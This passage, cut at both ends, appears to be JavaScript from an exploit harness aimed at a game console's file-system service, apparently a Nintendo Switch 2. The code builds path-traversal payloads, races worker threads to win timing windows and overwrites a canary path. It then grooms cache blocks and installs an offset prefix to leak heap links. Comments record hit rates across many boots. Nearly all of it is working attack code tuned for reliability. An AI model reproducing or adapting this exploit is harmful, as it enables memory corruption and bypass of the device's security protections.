      const positivePinBefore = readbackFirstPositive ? pinHandle : null;
      released = false;
      for (const gate of gates) await events.clear(s, gate);
      await s.write(completedFlag, Buffer.alloc(32));
      if (profile === 'abort-control') await s.write(completedFlag, Buffer.from([1, 0, 0, 0]));
      if (profile === 'abort-hole-control') await s.write(holeFinished, Buffer.from([1, 0, 0, 0]));
      fileHandle = domain.oneHandle(await normal(saved, 8, filename, Buffer.from([3, 0, 0, 0])));
      check(!(await s.ipc('Dirty gap commit data', fileHandle, 1,
        Buffer.concat([u64(0), u64(0), u64(writeSize)]),
        {send: [{address: writeData, size: writeSize, mode: 1}]})).result, 'Scratch write failed');
      await s.close(fileHandle);
      fileHandle = null;
      const payload = customPayload ? Buffer.from(customPayload) : Buffer.alloc(extent + 1, '/');
      payload[payload.length - 1] = 0;
      const isExtent = profile.startsWith('extent-');
      const isPositive = ['positive', 'binary-control', 'address-encoding-control'].includes(profile) || profile.startsWith('locate-');
      if (customPayload) {
        check(payload.subarray(0, 4).equals(Buffer.from('/..\\')), 'Custom copy prefix differs');
        check(!payload.subarray(0, -1).includes(0), 'Custom copy has an embedded terminator');
      } else if (isExtent) {
        payload.write(scratch + '/');
        for (let i = 0; i < segments.length; i++) payload.write('/' + segments[i] + '/', (i + 1) * 0x800);
        const basename = profile === 'extent-present' ? marker : absent;
        payload.write(basename, extent - basename.length);
      } else {
        if (isPositive) {
          payload.fill('B', 0, extent);
          payload.write(selectedDirectory, markerOffset);
          payload.fill('/', markerOffset + selectedDirectory.length, extent);
        }
        payload.write(isPositive ? '/..\\' : '/../');
        if (profile === 'address-encoding-control') addressPlan.writes[0].bytes.copy(payload, 0x100);
      }
      const pieces = [];
      for (let at = 0; at < payload.length; at += 0x800) pieces.push(payload.subarray(at, at + 0x800));
      check(pieces.length === 5, 'Unexpected receive extent');
      await s.measure('inputs:' + profile, async () => {
        await put(triggerInput, pieces[0]);
        for (let i = 0; i < 4; i++) await put(tailInputs[i], pieces[i + 1]);
        const reads = pieces.map((bytes, i) => ({address: i === 0 ? triggerInput : tailInputs[i - 1], bytes: bytes.length}));
        const actual = (await s.readOwnedMany(reads));
        actual.forEach((bytes, i) => check(bytes.equals(pieces[i]), 'Native input piece differs: ' + i));
      });
      const triggerHandle = Buffer.alloc(4);
      triggerHandle.writeUInt32LE(isExtent ? tmpTrigger : savedTrigger);
      await s.write(b + 0x2a04, triggerHandle);
      if (!group) await s.measure('reservation:' + profile, reserveGroup);
      const packets = [packet(10), packet(0, Buffer.concat([u64(0), u64(readSize)]),
        {receive: [{address: output, size: readSize, mode: 1}]})];
      for (let i = 0; i < 4; i++) packets.push(pathPacket(1002, Buffer.alloc(0), tailInputs[i], pieces[i + 1].length));
      packets.push(pathPacket(7, Buffer.alloc(0), b + 0x40000, canarySize), Buffer.from(fillerRequest),
        Buffer.from(fillerRequest), null, Buffer.from(guardRequest), Buffer.from(guardRequest),
        pathPacket(7, Buffer.alloc(0), triggerInput, 0x800));
      let preparedCanaryRequest;
      await s.measure('requests:' + profile, async () => {
        const writes = packets.flatMap((bytes, i) => bytes ? [{address: requests[i],
          bytes: context(bytes, i === 0 || i >= 2 && i < 6 ? 3 : 9)}] : []);
        writes.push({address: requests[9], bytes: domain.wire.closeObject(group.outer)},
          {address: preReleaseBuffer, bytes: context(packet(1009))},
          {address: clearReportBuffer, bytes: context(packet(1009))});
        writes.push({address: pinBuffer, bytes: context(packet(createPin ? 200 : 1009))});
        const staged = packPages(requests[0], 16 * 4096, writes);
        if (readbackFirstPositive) {
          preparedCanaryRequest = context(pathPacket(7, Buffer.alloc(0), b + 0x40000, canarySize), 9);
          check(staged.subarray(requests[6] - requests[0],
            requests[6] - requests[0] + positiveReadback.REQUEST_BYTES).equals(preparedCanaryRequest),
          'Staged positive canary request differs');
        }
        await s.write(requests[0], staged);
      });
      const workersAt = performance.now();
      await s.measure('workers:' + profile, async () => {
        if ((workers.length === plans.length)) await native.restartAll(s, workers);
        else for (let i = 0; i < plans.length; i++) {
          workers[i] = workers[i] ? await native.restart(s, workers[i]) : await native.start(s,
            b + 0x100000 + i * 0x40000, 0x40000, b + 0x2000 + i * 16, plans[i],
            label + '-' + i, b + 0x500000 + i * 0x40000);
        }
        // Seedsow: affinity.cjs still uses the SmileBASIC thread-scheduling
        // offsets; verifyCode is bypassed, so pinning can corrupt the workers.
        if (live.session !== 'seedsow')
          await affinity.pinAll(s, workers, workers.map((_, i) => cores[i % cores.length]));
      });
      const workersMs = performance.now() - workersAt;
      const phase = describePhase(profile);
      report.progress = {percent: Math.max(report.progress?.percent || 0, phase.percent),
        label: phase.label, profile, at: new Date().toISOString()};
      report.active = {profile, readSize};
      await save();
      console.log(JSON.stringify({stage: 'prepared', ...report.active, file}));
      let positiveBefore;
      if (readbackFirstPositive) {
        try {
          positiveBefore = await positiveReadback.capture(s, b + 0x40000, canarySize, requests[6]);
          positiveReadback.checkPrepared(positiveBefore, Buffer.from(canary + '\0'), preparedCanaryRequest);
        } catch (error) {
          (report.firstPositiveGuardedRetry ||= {}).preSignalError = error.message;
          await save();
          throw error;
        }
      }
      // The slow (PC-built frame) path spent ~1 s per wave launching workers and
      // hashing frames; the successful Seedsow run was on that path. When the
      // canary/alias windows do not land, try NS2_WAVE_SETTLE_MS=1000 to give the
      // FS service the same idle time before the gates are released.
      // The 1 s settle was ~half of stage 2's wall time. Apply it only when a
      // wave is a retry of the same phase: first attempts usually land, and a
      // missed window still gets the full settle on its next attempt.
      // NS2_WAVE_SETTLE_ALWAYS=1 restores the old blanket behaviour.
      const settleKey = String(profile).replace(/-\d+$/, '');
      const attemptCount = (waveAttemptCounts.get(settleKey) || 0) + 1;
      waveAttemptCounts.set(settleKey, attemptCount);
      const settleAt = performance.now();
      const settle = Number(process.env.NS2_WAVE_SETTLE_MS || 0);
      // First attempts of the canary/alias families are where the measured
      // failures live (positive wave and combined-leak batch 0). A short idle
      // before releasing the gates gives the FS service the same quiet state a
      // retry used to provide, without paying it on every control wave.
      const firstSettle = Number(process.env.NS2_FIRST_WAVE_SETTLE_MS || 500);
      // alias-probe runs before the install and must see the same quiet FS
      // state the first combined-leak copy used to get.
      const needsFirstSettle = /positive|combined-leak|extent-present|alias-probe/.test(profile);
      const always = process.env.NS2_WAVE_SETTLE_ALWAYS === '1';
      // Measured: 29 of 49 waves settled, 29 s of 161 s wall time. Keep the full
      // delay for the first retry, then use a shorter one.
      const settleWait = always ? settle
        : attemptCount > 1 ? (attemptCount === 2 ? settle : Math.min(settle, 400))
        : needsFirstSettle ? firstSettle : 0;
      if (settleWait > 0) await new Promise(resolve => setTimeout(resolve, settleWait));
      const settleMs = performance.now() - settleAt;
      released = true;
      // The trigger worker now waits on armGate, sleeps 40 ms on the console,
      // then signals master. The host only arms it and stays quiet, so the
      // release no longer includes the host RTT.
      localReleaseMayHaveRun = true;
      report.localRelease.armState = 'may-have-run';
      await save();
      try {
        report.localRelease.arm = await localRelease.armAndQuiet({
          signalArm: () => events.signal(s, armGate),
          requests: () => s.metrics.requests,
          now: () => performance.now(),
          pause: ms => new Promise(resolve => setTimeout(resolve, ms)),
        });
        report.localRelease.armState = 'acknowledged';
      } catch (error) {
        report.placementUncertain = true;
        report.localRelease.armError = error.stack;
        await save();
        throw error;
      }
      const joinAt = performance.now();
      await s.measure('join:' + profile, async () => {
        await native.joinAll(s, workers, profile === 'positive' ? 10000 : 15000);
      });
      const joinMs = performance.now() - joinAt;
      const firstIpc = workers[0].calls.findIndex(step => step.kind === 'ipc');
      const origin = workers[0].results[firstIpc - 1], rows = [];
      const ipcSteps = workers.flatMap(worker => worker.calls.flatMap((step, index) =>
        step.kind === 'ipc' ? [{worker, step, index}] : []));
      const replies = (await s.measure('replies:' + profile, () =>
        s.readOwnedMany(ipcSteps.map(({step}) => ({address: step.args[0], bytes: 256})))));
      for (const [replyIndex, {worker, index, step}] of ipcSteps.entries()) {
        check(worker.results[index] === 0n, 'Native gap transport failed at ' + step.name);
        const bytes = (replies[replyIndex]);
        const reply = step.name === 'release' ? null : response(bytes);
        if (step.name === 'pin' && createPin) {
          check(!reply.result && reply.moves.length === 1 && !reply.copies.length, 'Pinning storage did not open');
          pinHandle = reply.moves[0];
          s.handles.add(pinHandle);
          report.pinHandle = pinHandle;
        }
        rows.push({role: step.name, result: reply ? reply.canonicalResult : 0,
          inline: reply ? reply.data.subarray(0, 16).toString('hex') : bytes.subarray(0, 32).toString('hex'),
          memory: step.name === 'preRelease' ? Array.from({length: 16}, (_, i) => Number(reply.data.readBigUInt64LE(i * 8))) : undefined,
          startUs: Number(worker.results[index - 1] - origin) * 1e6 / frequency,
          endUs: Number(worker.results[index + 1] - origin) * 1e6 / frequency});
      }
      group.outer = null;
      group.objects.length = 0;
      const after = await memory(), trigger = rows.find(row => row.role === 'trigger');
      const heldPaths = rows.filter(row => ['canary', 'filler0', 'filler1', 'guard0', 'guard1'].includes(row.role));
      const beforeRelease = rows.find(row => row.role === 'preRelease');
      const canaryRow = rows.find(row => row.role === 'canary');
      const pinRow = rows.find(row => row.role === 'pin');
      // The trigger worker can issue the pin inside the canary request window.
      // In that path createPin is false but the pin allocation is intentionally
      // still held, so the heap counter is below the pre-wave baseline.
      const pinningOverlapped = canaryRow.startUs < pinRow.startUs &&
        pinRow.endUs < canaryRow.endUs;
      const overlap = qualifyOverlap(rows);
      // The first wave creates the pin, so its persistent cost is measured here
      // and adopted for the rest of the run. Two independent checks re-verify it
      // later: the candidate open (cache.allocationBytes) and, when the initial
      // pin is released, the released byte count.
      const measuredPinBytes = createPin ? group.before[5] - after[5] : 0;
      if (createPin) {
        if (pinBytes === null) {
          check(measuredPinBytes >= 0x400 && measuredPinBytes <= 0x40000,
            'Pinning allocation cost is implausible: ' + measuredPinBytes + ' bytes');
          pinBytes = measuredPinBytes;
          report.pinBytes = pinBytes;
          report.pinBytesSource = 'measured';
          console.log(JSON.stringify({stage: 'pin-cost', bytes: pinBytes,
            storageOpenCost: report.storageOpenCost ?? null}));
        } else {
          check(measuredPinBytes === pinBytes, 'Pinning allocation cost changed: expected ' +
            pinBytes + ' bytes, measured ' + measuredPinBytes);
        }
      }
      const guardBytes = await s.readOwned(completedFlag, 32);
      const nativeGuard = {completed: guardBytes.readUInt32LE(completedDecision - completedFlag),
        earlyHole: guardBytes.readUInt32LE(holeDecision - completedFlag),
        minimumSpacing: guardBytes.readUInt32LE(spacingDecision - completedFlag)};
      const row = {profile, readSize, extent: payload.length - 1, rows,
        nativeGuard, triggerAborted: Boolean(nativeGuard.completed || nativeGuard.earlyHole || nativeGuard.minimumSpacing),
        receiveOrderMarginUs: rows.find(r => r.role === 'hole').endUs - rows.find(r => r.role === 'guard1').startUs,
        preReleaseUsed: group.held[5] - beforeRelease.memory[5],
        // Only the wave that creates the pin is below the pre-wave baseline: on
        // every later wave the pin is already held, so before and after must
        // match with no correction. Adding pinBytes unconditionally here made
        // every wave report restored=false and no extent wave could qualify.
        restored: after[5] + (createPin ? measuredPinBytes : 0) === group.before[5], baseline: group.before[5], after: after[5],
        newPersistentBytes: measuredPinBytes,
        pinningOverlapped,
        allPending: overlap.qualified, pendingMode: overlap.mode,
        selectedMarker: trigger.result === 0 && Buffer.from(trigger.inline, 'hex').readUInt32LE() === 1,
        changedPaths: heldPaths.filter(r => r.result !== (r.role === 'canary' ? 0 : 0x202) ||
          r.role === 'canary' && Buffer.from(r.inline, 'hex').readUInt32LE() !== 1).map(r => r.role),
        canaryResult: canaryRow.result,
        canaryType: canaryRow.result ? null : Buffer.from(canaryRow.inline, 'hex').readUInt32LE()};
      if (readbackFirstPositive && hasWindow(row) && row.canaryResult === 0x2eea02 &&
          row.changedPaths.length === 1 && row.changedPaths[0] === 'canary') {
        row.positiveReadback = {scope: 'first-strict-positive-changed-result',
          requestPageAfterIsIpcReply: true, preparedPathMatches: true,
          preparedRequestMatches: true};
        try {
          const afterReadback = await positiveReadback.capture(s, b + 0x40000, canarySize, requests[6]);
          Object.assign(row.positiveReadback, positiveReadback.describe(positiveBefore, afterReadback));
          row.positiveReadback.postPathMatchesPrepared = afterReadback.path.equals(Buffer.from(canary + '\0'));
        } catch (error) {row.positiveReadback.afterError = error.message;}
      }
      if (readbackFirstPositive && row.canaryResult === 0x2eea02)
        report.firstPositiveGuardPending = true;
      // Per-phase wall time, so the next optimisation is chosen from data rather
      // than guesswork. Read back with: report.timings.
      const timings = (report.timings ||= {waves: 0, totalMs: 0, workersMs: 0, joinMs: 0,
        settleMs: 0, requests: 0});
      timings.waves += 1;
      timings.totalMs += performance.now() - hostStarted;
      timings.workersMs += workersMs;
      timings.joinMs += joinMs;
      timings.settleMs += settleMs;
      timings.requests += s.metrics.requests - hostRequests;
      report.cases.push(row);
      delete report.active;
      await save();
      console.log(JSON.stringify(row));
      if (candidateHandle && !row.restored && !row.pinningOverlapped) {
        report.placementUncertain = true;
        report.heapDrift = {profile, expected: row.baseline, observed: row.after,
          difference: row.after - row.baseline};
        await save();
        throw Error('General-heap allocation changed while the cache was retained; stop overwrites and recover');
      }
      if ((isPositive || customPayload) && !row.triggerAborted && !row.allPending) {
        report.placementUncertain = true;
        await save();
        throw Error('A protected request ended during the overwrite; retain resources for recovery');
      }
      await closeGroup();
      row.pinningCreated = createPin;
      check(pinRow.result === 0, 'Pinning request failed');
      check(rows.filter(r => ['commit', 'hole', 'clearReport', 'preRelease'].includes(r.role)).every(r => r.result === 0), 'Ordinary gap request failed');
      check(rows.filter(r => r.role.startsWith('tail')).every(r => r.result === 0x320002), 'Deferred seed result differs');
      check(rows.filter(r => r.role.startsWith('guard')).every(r => r.result === 0x202), 'Guard result differs');
      check(rows.filter(r => r.role.startsWith('filler')).every(r => r.result === 0x202 ||
        (isPositive || customPayload) && r.result === 0x2eea02), 'Unexpected filler result');
      const metadataCanaryMiss = customPayload && row.changedPaths.length === 1 &&
        row.changedPaths[0] === 'canary' && canaryRow.result === 0x2eea02;
      // A metadata copy can land on the still-owned path canary. Let the
      // caller retry this measured miss after checking the file below.
      if (!isPositive && !metadataCanaryMiss)
        check(!canaryRow.result && row.canaryType === 1, 'Control changed the canary');
      if (row.triggerAborted) check(trigger.result === report.abortControlResult, 'Native abort differs from the empty-path control');
      else if (profile === 'binary-control') check([0x2eea02, 0x2eec02].includes(trigger.result), 'Unexpected binary-path result');
      else if (!isExtent) check(trigger.result === 0x2eec02, 'Backslash control result differs');
      const health = await normal(saved, 7, canary);
      check(!health.result && health.data.readUInt32LE() === 1, 'Canary file changed on disk');
      row.diskHealthy = true;
      row.host = {elapsedMs: performance.now() - hostStarted, requests: s.metrics.requests - hostRequests};
      await s.record({operation: 'waveTiming', profile, ...row.host,
        nativeElapsedMs: Math.max(...rows.map(row => row.endUs)) / 1000});
      check((row.restored || row.pinningOverlapped) && row.diskHealthy && !group && !s.threads.size &&
        workers.length === plans.length && workers.every(worker => worker.joined),
      'Local release wave did not restore and join all workers');
      localReleaseMayHaveRun = false;
      await runControl.end(profile);
      if (createPin && !row.pinningOverlapped) {
        // The reply, abort, path, disk and restoration checks have completed.
        // A miss outside this owned initial control still ends the attempt.
        if (retryablePinningMiss(row, pinBytes) && !candidateHandle && !cacheNeedsRestore &&
            !report.placementUncertain && !s.threads.size && !group)
          throw new PinningWindowMiss(row);
        throw Error('Pinning storage was not created while the canary was pending');
      }
      if (readbackFirstPositive) row.positiveRetryState = {
        waveChecksPassed: true, diskHealthy: row.diskHealthy,
        workersJoined: workers.length === plans.length && workers.every(worker => worker.joined) && !s.threads.size,
        groupClosed: !group,
        ownedHandlesStable: positiveHandlesBefore.size === s.handles.size &&
          [...positiveHandlesBefore].every(handle => s.handles.has(handle)),
        pinStillOwned: !!positivePinBefore && pinHandle === positivePinBefore &&
          s.handles.has(pinHandle) && !row.pinningCreated,
        noCandidateCacheOrUncertainty: !candidateHandle && !cacheNeedsRestore && !restoreCandidate &&
          !report.cacheAlias && !report.cacheRange && !report.placementUncertain,
      };
      return row;
    }

    const hasWindow = row => row.restored && !row.triggerAborted && row.allPending && row.receiveOrderMarginUs >= 300 &&
      row.preReleaseUsed >= 0x2600;
    async function retryWave(profile, readbackFirstPositive = false) {
      if (readbackFirstPositive) {
        check(profile === 'positive', 'Guarded FS 6005 retry is first-positive only');
        // 85 recorded boots: every success selected the canary on wave 1, and
        // every miss returned the same unchanged canary for 30 consecutive
        // waves. Retrying past the first few waves has never recovered a boot,
        // so the default budget is 8 (about 20 s less on a doomed one). The
        // FS 6005 continuation path is unchanged: it still extends by 15 up to
        // 60 when a wave really does qualify and only the readback differs.
        const positiveAttempts = Math.max(1, Math.floor(Number(process.env.NS2_POSITIVE_ATTEMPTS)) || 8);
        const diagnostic = report.firstPositiveGuardedRetry = {initialWaveLimit: positiveAttempts,
          absoluteWaveLimit: 60, extensionPerContinuation: 15, maxContinuations: 2,
          wavesCompleted: 0, fs6005Observed: 0, continued: 0, decisions: []};
        return positiveReadback.retryFirstPositive({
          initialAttempts: positiveAttempts,
          nextWave: () => wave(profile, probeReadSize, null, true), hasWindow,
          state: row => row.positiveRetryState,
          onWave: attempts => {diagnostic.wavesCompleted = attempts;},
          onDecision: async decision => {
            if (decision.kind === 'fs6005') diagnostic.fs6005Observed++;
            diagnostic.continued = decision.continuations;
            diagnostic.decisions.push(decision);
            const rejected = decision.kind === 'fs6005' && !decision.continued;
            await positiveReadback.persistFirstPositiveDecision(report, decision, save);
            console.log(JSON.stringify({stage: 'first-positive-guarded-retry', ...decision}));
            if (rejected) {
              throw Error('First-positive FS 6005 retry rejected: ' + decision.reasons.join(', '));
            }
          },
        });
      }
      let row;
      const deadline = profile === 'positive' ? Date.now() + positiveWaveMs : 0;
      for (let attempt = 0; attempt < waveAttempts; attempt++) {
        if (deadline && Date.now() > deadline) {
          report.positiveWaveTimedOut = {at: new Date().toISOString(), attempt,
            limitMs: positiveWaveMs};
          await save();
          break;
        }
        row = await wave(profile, probeReadSize);
        if (!hasWindow(row)) continue;
        if (profile === 'extent-present' && !row.selectedMarker) continue;
        // An unchanged owned canary can be retried before a cache exists.
        // Other changed paths still fail the placement checks below.
        if (profile === 'positive' && row.canaryResult === 0 && row.canaryType === 1 &&
            row.changedPaths.length === 0) continue;
        break;
      }
      return row;
    }
    async function checkExtent() {
      const row = await retryWave('extent-present');
      check(row.selectedMarker && hasWindow(row), 'The interleaved input extent did not requalify');
    }
    // NS2_SKIP_EXTENT_REQUAL=1 keeps the extent already proven by the earlier
    // wave instead of retrying it after every marker write (the parallel port
    // recorded this step as the most common post-marker failure).
    async function requalify(stage) {
      if (!skipExtentRequal) return checkExtent();
      report.extentRequalSkipped = (report.extentRequalSkipped || 0) + 1;
      (report.extentRequalSkipStages ||= []).push(stage);
      await save();
    }

    async function releaseInitialPin(row, attempt) {
      check(releasablePinningControl(row, pinBytes) && row.diskHealthy === true &&
        pinHandle && s.handles.has(pinHandle) && !s.threads.size && !group &&
        !candidateHandle && !cacheNeedsRestore && !report.placementUncertain,
        'Cannot release the initial pin from this state');
      const before = await memory();
      await s.close(pinHandle);
      pinHandle = null;
      report.pinHandle = null;
      const after = await memory();
      const releasedBytes = after[5] - before[5];
      row.pinningRetry = {attempt, before: before[5], after: after[5], releasedBytes};
      await save();
      check(releasedBytes === pinBytes, 'Initial pin release accounting differs: expected ' +
        pinBytes + ' bytes, released ' + releasedBytes + '; stop rather than retry');
      console.log(JSON.stringify({stage: 'pinning-window-miss', attempt, releasedBytes,
        willRetry: attempt < 3}));
    }
    const abortControl = await retryPinningControl(
      () => wave('abort-control', probeReadSize), releaseInitialPin, pinBytes);
    check(abortControl.triggerAborted && abortControl.nativeGuard.completed === 1, 'Native abort control failed');
    const holeAbortControl = await wave('abort-hole-control', probeReadSize);
    check(holeAbortControl.triggerAborted && holeAbortControl.nativeGuard.earlyHole === 1 &&
      holeAbortControl.nativeGuard.minimumSpacing === 1, 'Native receive-order abort failed');
    await wave('extent-absent', probeReadSize);
    const result = await retryWave('extent-present');
    const qualified = result.selectedMarker && hasWindow(result) ? probeReadSize : null;
    report.qualifiedReadSize = qualified || null;
    if (qualified) {
      const control = await retryWave('negative');
      if (hasWindow(control)) {
        const positive = await positiveReadback.requireFirstPositiveRow(
          await retryWave('positive', true), report, save);
        report.canaryChanged = positive.changedPaths.includes('canary') && positive.allPending &&
          positive.receiveOrderMarginUs >= 300;
        report.markerSelected = (report.canaryChanged) && positive.canaryType === 0 &&
          positive.changedPaths.every(name => name === 'canary') && hasWindow(positive);
        if (report.markerSelected || positive.triggerAborted) report.firstPositiveGuardPending = false;
        if ((!positive.triggerAborted) && !report.markerSelected) {
          report.placementUncertain = true;
          await save();
          throw Error('Overwrite missed the qualified canary; retain resources for recovery');
        }
        // The locator already traversed and checked the full input extent.
        // Keep its allocation sequence intact through the directory controls.
        await requalify('after-positive');
        if ((report.markerSelected)) {
          if (skipRepro) {
            // One confirmed marker is the proof; the alias content check below
            // is independent evidence that it landed in the cache entry.
            report.markerReproduced = true;
            report.markerReproduction = 'skipped (NS2_SKIP_REPRO=1)';
            await save();
          } else {
            const repeated = await retryWave('positive');
            report.markerReproduced = repeated.canaryType === 0 &&
              repeated.changedPaths.every(name => name === 'canary') && hasWindow(repeated);
            if (!repeated.triggerAborted && !report.markerReproduced) {
              report.placementUncertain = true;
              await save();
              throw Error('Repeated overwrite missed the canary; retain resources for recovery');
            }
            await requalify('after-reproduction');
          }
        }
        if (addressPlan && report.markerReproduced) {
          const encoded = await retryWave('address-encoding-control');
          report.cacheAddress.encodingControl = {copied: hasWindow(encoded) && encoded.canaryType === 0,
            result: encoded.rows.find(row => row.role === 'trigger').result};
          check(report.cacheAddress.encodingControl.copied, 'The encoded pointer prefix did not reach the native marker');
          await requalify('after-encoding-control');
        }
        if ((report.markerReproduced)) {
          // The combined leak reads the cache bucket selected by this file
          // offset, and a bucket is usable or not for the whole boot. Measured
          // over the 69 runs that reached this phase: 25 spent a full install
          // and then the boot on an offset whose lookup never selected the
          // modified entry (the three dead offsets in the old rotation list
          // were 0/21), 24 installed but exposed only stable links, and 20
          // exposed a changed or zero-tail link. So keep a list of buckets and
          // walk it inside one boot: a dead bucket then costs one copy and a
          // read (~2 waves) instead of a full seven-step install, and the
          // confirmed marker of this boot is not thrown away.
          const configured = String(process.env.NS2_ALIAS_OFFSETS || '')
            .split(',').map(value => value.trim()).filter(Boolean).map(Number);
          const single = Number(process.env.NS2_ALIAS_OFFSET);
          // Order: the offset the launcher picked for this boot first, then the
          // list. The defaults are the five offsets that aliased on every boot
          // we measured, ordered by how often they exposed a usable link. The
          // three measured-dead offsets (0x1500000, 0x15A0000, 0x12B0000) are
          // deliberately absent.
          const buckets = [...new Set([...(single ? [single] : []), ...configured,
            0x14a0000, 0x13b0000, 0x1450000, 0x1400000, 0x1360000])]
            .filter(value => Number.isSafeInteger(value) && value >= 0 &&
              value % 0x4000 === 0 && value + cacheReadSize <= Number(storageSize));
          check(buckets.length, 'No NS2_ALIAS_OFFSETS bucket fits this storage');
          const bucketLimit = Math.max(1, Math.min(buckets.length,
            Math.floor(Number(process.env.NS2_ALIAS_BUCKETS)) || 3));
          let aliasOffset = buckets[0], leakOffset = buckets[0];
          const cache = report.cacheAlias = {targetOffset: markerOffset, clean: true,
            outputPoison: 0xa5, aliasOffset, bucketOrder: buckets.slice(0, bucketLimit), buckets: []};
          const hash = bytes => crypto.createHash('sha256').update(bytes).digest('hex');
          // payload=false is for callers that only need the FS result (the
          // groom primes cache blocks and can only compare inside the control
          // window). The reply already carries the result, so the poison store
          // and the readback are two console round trips of no value there.
          async function readStorage(handle, size, offset = 0, poison = cache.outputPoison,
            bounded = false, payload = true) {
            // Distinguish a real copy from a successful call that leaves the
            // receive buffer untouched after a malformed cache lookup.
            if (payload) await s.call('memset', output, poison, size);
            const reply = await s.ipc('Read candidate content', handle, 0, Buffer.concat([u64(offset), u64(size)]),
              {receive: [{address: output, size, mode: 1}], bounded});
            if (reply.result) return {result: reply.canonicalResult, bytes: null};
            if (!payload) return {result: reply.canonicalResult, bytes: null};
            const bytes = size >= 0x8000 ? await bulk.read(s, output, size) : await s.readOwned(output, size);
            return {result: reply.canonicalResult, bytes};
          }
          // Content-cache priming only needs "did this block read succeed", so
          // up to 32 single-block reads share one staged upload and one read of
          // their reply pages. Each request needs its own page because the
          // kernel overwrites it with the reply (same pattern as reserveGroup).
          // 32 blocks cost 34 console requests instead of 96.
          async function fillBlocks(handle, offsets) {
            const failed = [];
            for (let first = 0; first < offsets.length; first += 32) {
              const batch = offsets.slice(first, first + 32);
              const pages = batch.map((_, i) => b + 0x60000 + i * 4096);
              const staged = Buffer.alloc(batch.length * 4096);
              batch.forEach((offset, i) => packet(0, Buffer.concat([u64(offset), u64(16)]),
                {receive: [{address: output, size: 16, mode: 1}]}).copy(staged, i * 4096));
              await s.write(pages[0], staged);
              const sent = await s.rpc.batch(pages.map(page =>
                ({fn: live.sdk + functions.send.offset, args: [page, 4096, handle]})));
              const replies = await s.readOwned(pages[0], batch.length * 4096);
              batch.forEach((offset, i) => {
                // A transport failure leaves no reply in the page, so only the
                // pages of delivered requests are parsed.
                if (sent[i]?.result) { failed.push(offset); return; }
                try {
                  if (response(replies.subarray(i * 4096, i * 4096 + 256)).result) failed.push(offset);
                } catch { failed.push(offset); }
              });
            }
            return failed;
          }
          const controlSize = Math.max(0x8000, cacheReadSize);
          const control = await readStorage(storage, controlSize);
          check(!control.result, 'Cache-range content control failed');
          cache.controlFile = path.join(OUT, label + '-range-control.bin');
          await fs.writeFile(cache.controlFile, control.bytes, {mode: 0o600});
          cache.controlSha256 = hash(control.bytes);
          // The per-bucket alias control is read inside the bucket loop below.
          await reserveGroup();
          const beforeCandidate = await memory();
          candidateHandle = domain.oneHandle(await s.ipc('Reuse the canary slot with own content', root, 200));
          const prime = await readStorage(candidateHandle, 16);
          check(!prime.result && prime.bytes.equals(control.bytes.subarray(0, 16)), 'Candidate content differs');
          const afterCandidate = await memory();
          cache.allocationBytes = beforeCandidate[5] - afterCandidate[5];
          group.before[5] -= cache.allocationBytes;
          group.held[5] -= cache.allocationBytes;
          check(cache.allocationBytes === pinBytes, 'Candidate allocation cost differs: pin ' +
            pinBytes + ' bytes, candidate ' + cache.allocationBytes);
          await save();

          const ownerControls = [];
          async function copyField(tail, name, requiredCopies = fieldCopies) {
            check(Number.isInteger(requiredCopies) && requiredCopies >= 1 && requiredCopies <= fieldCopies,
              'Invalid number of field-copy controls');
            const length = fieldOffset + tail.length + 1;
            // The wave demand must still split into exactly five 0x800 pieces.
            check(length > 0x2000 && length <= 0x2800,
              'Field copy length ' + length + ' is outside the five-piece window');
            const bytes = Buffer.alloc(length, 'B');
            bytes.write('/..\\');
            tail.copy(bytes, fieldOffset);
            bytes[bytes.length - 1] = 0;
            for (let batch = 0; batch < 3; batch++) {
              let confirmed = 0, attempts = 0, bestMargin = -Infinity, aborted = 0, misses = 0;
              const guards = {completed: 0, earlyHole: 0, minimumSpacing: 0};
              for (let attempt = 0; attempt < requiredCopies * 20 && confirmed < requiredCopies; attempt++) {
                const row = await wave('cache-' + name + '-' + batch + '-' + attempt, qualified, bytes);
                attempts++;
                if (Number.isFinite(row.receiveOrderMarginUs)) bestMargin = Math.max(bestMargin, row.receiveOrderMarginUs);
                if (row.triggerAborted) {
                  aborted++;
                  for (const key of Object.keys(guards)) if (row.nativeGuard?.[key]) guards[key]++;
                }
                if (row.changedPaths.length) misses++;
                // Every retry writes the same prefix. An aborted copy or a
                // known path-canary miss is not evidence against an earlier
                // accepted window. Count accepted windows without requiring
                // consecutive placement; native readback remains the proof.
                const accepted = hasWindow(row) && row.preReleaseUsed >= minimumCacheHeld && row.changedPaths.length === 0;
                if (accepted) confirmed++;
              }
              if (confirmed === requiredCopies) break;
              check(runControl.state.mode !== 'retiring', 'Cleanup field copies did not retain the required receive order');
              if (batch < 2) {
                console.log(JSON.stringify({stage: 'field-copy-retry', name, batch, confirmed,
                  required: requiredCopies, attempts}));
                continue;
              }
              throw Error('Field copy did not qualify within its attempt limit: ' + name +
                ' [batch ' + batch + ', accepted ' + confirmed + '/' + requiredCopies +
                ', attempts ' + attempts + ', best margin ' +
                (Number.isFinite(bestMargin) ? bestMargin.toFixed(0) : 'none') + ' us (needs 300)' +
                ', native aborts ' + aborted + ' [completed ' + guards.completed +
                ', earlyHole ' + guards.earlyHole + ', minimumSpacing ' + guards.minimumSpacing + ']' +
                ', canary misses ' + misses + ']');
            }
          }
          async function setAliasOffset(name) {
            const steps = canonicalPlanner.nulWrites(u64(aliasOffset));
            for (const step of steps) await copyField(step.bytes, name + '-' + step.end);
          }
          // copies=1 gives a valid install at half the wave cost: the read that
          // follows is the proof that the whole prefix landed, because the
          // lookup only returns block-0 content when it did. The prefix cannot
          // be tested with a shorter copy - the zero bytes of the offset are
          // placed by their own copies, so a one-step copy cannot encode the
          // bucket at all and every live bucket looks dead.
          async function installCombinedLeak(name, copies = fieldCopies) {
            check(aliasOffset + cacheReadSize <= Number(storageSize), 'Combined read exceeds storage size');
            // The offset is copied through the FS path normalizer, which
            // fatally validates UTF-8. A byte >= 0x80 (e.g. 0x1428000) makes
            // cache-address-plan.cjs throw "The encoded data was not valid for
            // encoding utf-8". Keep every offset byte ASCII; 0x50000 steps.
            for (const shift of [0, 8, 16, 24])
              check(((aliasOffset >>> shift) & 0xff) < 0x80,
                'NS2_ALIAS_OFFSET is not UTF-8 safe; every byte must be < 0x80 (use 0x50000 steps)');
            const prefix = Buffer.alloc(0x12);
            prefix.writeBigUInt64LE(BigInt(aliasOffset));
            prefix.writeBigUInt64LE(0x4141414141414141n, 8);
            prefix[0x10] = 1;
            // The last NUL leaves dirty=0 and preserves the genuine handle.
            const steps = canonicalPlanner.nulWrites(prefix);
